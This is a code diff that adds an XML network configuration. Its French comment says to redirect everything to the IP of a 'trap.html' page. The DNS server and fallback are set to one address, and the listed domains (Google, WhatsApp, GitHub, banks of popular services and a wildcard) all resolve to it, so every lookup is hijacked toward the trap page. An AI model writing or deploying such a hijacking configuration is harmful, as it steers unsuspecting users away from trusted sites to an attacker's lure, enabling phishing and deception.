@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<network-config>
+    <dns>
+        <!-- Redirige tout vers l'IP de ta page trap.html -->
+        <server>89.234.184.249</server>
+        <fallback-server>89.234.184.249</fallback-server>
+        <domain>google.com</domain>
+        <domain>youtube.com</domain>
+        <domain>whatsapp.com</domain>
+        <domain>instagram.com</domain>
+        <domain>facebook.com</domain>
+        <domain>twitter.com</domain>
+        <domain>tiktok.com</domain>
+        <domain>snapchat.com</domain>
+        <domain>reddit.com</domain>
+        <domain>github.com</domain>
+        <domain>stackoverflow.com</domain>
+        <domain>wikipedia.org</domain>
+        <domain>amazon.com</domain>
+        <domain>netflix.com</domain>
+        <domain>spotify.com</domain>
+        <domain>discord.com</domain>
+        <domain>telegram.org</domain>
+        <domain>*</domain>
+    </dns>
+</network-config>
